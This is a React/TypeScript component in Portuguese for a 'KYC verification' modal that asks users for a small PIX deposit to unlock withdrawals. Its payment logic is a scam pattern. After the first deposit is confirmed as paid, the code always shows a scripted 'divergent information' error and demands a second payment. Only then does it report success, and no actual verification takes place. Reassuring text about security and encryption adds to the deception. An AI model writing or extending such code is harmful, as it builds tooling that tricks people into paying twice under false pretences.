import React, { useState, useEffect } from 'react';
import { X, Shield, CheckCircle, AlertCircle, Copy, QrCode } from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';

interface KYCDepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerificationComplete: () => void;
}

type ModalStep = 'intro' | 'generating' | 'pix' | 'processing' | 'error' | 'success';

export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
  isOpen,
  onClose,
  onVerificationComplete
}) => {
  const [step, setStep] = useState<ModalStep>('intro');
  const [attemptCount, setAttemptCount] = useState(0);
  const { loading, pixData, createPix, checkPixStatus, reset } = useFictionalPix();
  const [copied, setCopied] = useState(false);
  const [paymentCheckInterval, setPaymentCheckInterval] = useState<NodeJS.Timeout | null>(null);

  const DEPOSIT_AMOUNT = 4.90;

  useEffect(() => {
    if (isOpen) {
      setStep('intro');
      setAttemptCount(0);
      reset();
    } else {
      if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
        setPaymentCheckInterval(null);
      }
      reset();
    }
  }, [isOpen]);

  useEffect(() => {
    if (!pixData || !isOpen) return;

    const checkPayment = async () => {
      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid') {
          if (paymentCheckInterval) {
            clearInterval(paymentCheckInterval);
            setPaymentCheckInterval(null);
          }

          setStep('processing');

          setTimeout(() => {
            if (attemptCount === 0) {
              setStep('error');
              setAttemptCount(1);
              reset();

              setTimeout(() => {
                setStep('intro');
              }, 3000);
            } else {
              setStep('success');

              setTimeout(() => {
                onVerificationComplete();
                onClose();
              }, 3000);
            }
          }, 2500);
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();
    const interval = setInterval(checkPayment, 3000);
    setPaymentCheckInterval(interval);

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, isOpen, attemptCount, checkPixStatus, onVerificationComplete, onClose, paymentCheckInterval, reset]);

  const handleStartVerification = async () => {
    setStep('generating');

    try {
      await createPix(DEPOSIT_AMOUNT);
      setStep('pix');
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
      setStep('intro');
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="bg-gray-900 rounded-3xl shadow-2xl w-full max-w-md border border-gray-800 overflow-hidden">
        {step === 'intro' && (
          <>
            <div className="bg-gradient-to-r from-accent to-accent-hover p-6 relative overflow-hidden">
              <div className="absolute inset-0 bg-white/5"></div>
              <button
                onClick={onClose}
                className="absolute top-4 right-4 text-white/80 hover:text-white transition-colors z-10"
              >
                <X className="w-6 h-6" />
              </button>

              <div className="relative z-10">
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold text-white">Verificação KYC</h2>
                    <p className="text-white/80 text-sm">Confirme sua titularidade</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="p-6">
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
                <div className="flex gap-3">
                  <AlertCircle className="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-blue-300 text-sm font-semibold mb-2">
                      Por que é necessário?
                    </p>
                    <p className="text-blue-300/80 text-xs leading-relaxed">
                      A verificação KYC confirma o titular da conta e libera as funções financeiras, como saque e depósito. É uma medida de segurança obrigatória.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-800 rounded-2xl p-5 border border-gray-700 mb-6">
                <div className="text-center">
                  <div className="w-16 h-16 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-3">
                    <Shield className="w-8 h-8 text-accent" />
                  </div>
                  <h3 className="text-white font-bold text-lg mb-2">Depósito de Verificação</h3>
                  <p className="text-gray-400 text-sm mb-4">
                    Realize um depósito de confirmação via PIX
                  </p>

                  <div className="bg-accent/20 rounded-xl p-4 border border-accent/50 mb-4">
                    <div className="text-accent text-3xl font-bold mb-1">
                      R$ {DEPOSIT_AMOUNT.toFixed(2).replace('.', ',')}
                    </div>
                    <p className="text-gray-400 text-xs">Valor único de verificação</p>
                  </div>

                  <button
                    onClick={handleStartVerification}
                    className="w-full bg-accent text-white font-bold py-4 rounded-xl hover:bg-accent-hover transition-all duration-300 active:scale-95 shadow-modern"
                    style={{ touchAction: 'manipulation' }}
                  >
                    Iniciar Verificação
                  </button>
                </div>
              </div>

              <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-3">
                <div className="flex gap-2">
                  <Shield className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                  <p className="text-yellow-300/80 text-xs">
                    Dados seguros e criptografados. Processo rápido e automatizado.
                  </p>
                </div>
              </div>
            </div>
          </>
        )}

        {step === 'generating' && (
          <div className="p-8">
            <div className="text-center">
              <div className="w-20 h-20 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin"></div>
              </div>
              <h3 className="text-white font-bold text-xl mb-2">Gerando PIX...</h3>
              <p className="text-gray-400 text-sm">Aguarde um momento</p>
            </div>
          </div>
        )}

        {step === 'pix' && pixData && (
          <>
            <div className="bg-accent p-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                    <QrCode className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <h3 className="text-white font-bold">PIX Gerado</h3>
                    <p className="text-white/80 text-sm">R$ {pixData.amount.toFixed(2).replace('.', ',')}</p>
                  </div>
                </div>
                <button
                  onClick={onClose}
                  className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center hover:bg-white/30 transition-all"
                >
                  <X className="w-4 h-4 text-white" />
                </button>
              </div>
            </div>

            <div className="p-6 space-y-4">
              <div className="bg-gray-800 rounded-xl p-4 text-center border border-gray-700">
                <div className="bg-white rounded-lg p-4 inline-block mb-3">
                  <QRCodeGenerator
                    value={pixData.qrcode}
                    size={200}
                    className="mx-auto"
                  />
                </div>
                <p className="text-gray-400 text-sm">Escaneie o QR Code</p>
              </div>

              <div>
                <label className="block text-white font-semibold mb-2 text-sm">
                  Código PIX (Copia e Cola)
                </label>
                <div className="bg-gray-800 rounded-xl p-3 border border-gray-700">
                  <input
                    type="text"
                    value={pixData.qrcode}
                    readOnly
                    className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-xs font-mono mb-3 focus:outline-none text-white"
                    onClick={(e) => (e.target as HTMLInputElement).select()}
                  />
                  <button
                    onClick={copyPixCode}
                    className={`w-full py-3 rounded-lg font-bold transition-all duration-300 active:scale-95 ${
                      copied
                        ? 'bg-accent text-white'
                        : 'bg-accent text-white hover:bg-accent-hover'
                    }`}
                    style={{ touchAction: 'manipulation' }}
                  >
                    {copied ? (
                      <div className="flex items-center justify-center gap-2">
                        <CheckCircle className="w-4 h-4" />
                        <span>Copiado!</span>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-2">
                        <Copy className="w-4 h-4" />
                        <span>Copiar Código</span>
                      </div>
                    )}
                  </button>
                </div>
              </div>

              <div className="bg-green-900 border border-green-700 rounded-xl p-3">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 border-2 border-green-400 border-t-transparent rounded-full animate-spin"></div>
                  <p className="text-green-200 text-sm font-medium">
                    Aguardando pagamento...
                  </p>
                </div>
              </div>
            </div>
          </>
        )}

        {step === 'processing' && (
          <div className="p-8">
            <div className="text-center">
              <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
              </div>
              <h3 className="text-white font-bold text-xl mb-2">Processando Verificação</h3>
              <p className="text-gray-400 text-sm">Validando informações...</p>
            </div>
          </div>
        )}

        {step === 'error' && (
          <div className="p-6">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertCircle className="w-10 h-10 text-red-500" />
              </div>
              <h3 className="text-white font-bold text-xl mb-2">Erro na Verificação</h3>
              <p className="text-gray-400 text-sm mb-4">Informações divergentes detectadas</p>

              <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4">
                <p className="text-red-300 text-sm">
                  Por favor, refaça a verificação KYC para continuar
                </p>
              </div>
            </div>
          </div>
        )}

        {step === 'success' && (
          <div className="p-8">
            <div className="text-center">
              <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-10 h-10 text-white" />
              </div>
              <h3 className="text-white font-bold text-2xl mb-2">Verificação Concluída!</h3>
              <p className="text-gray-400 text-sm mb-4">
                Sua conta foi validada com sucesso
              </p>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4">
                <p className="text-green-300 text-sm font-semibold">
                  O saque está liberado!
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
